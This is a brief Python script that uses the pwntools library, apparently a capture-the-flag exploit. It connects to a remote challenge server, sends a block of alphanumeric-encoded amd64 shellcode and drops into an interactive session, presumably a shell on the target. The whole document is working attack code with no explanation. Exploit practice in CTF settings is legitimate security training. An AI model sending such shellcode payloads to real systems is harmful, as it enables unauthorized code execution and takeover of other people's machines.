from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10168)
shellcode = b'PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06'
io.send(shellcode)
io.interactive()
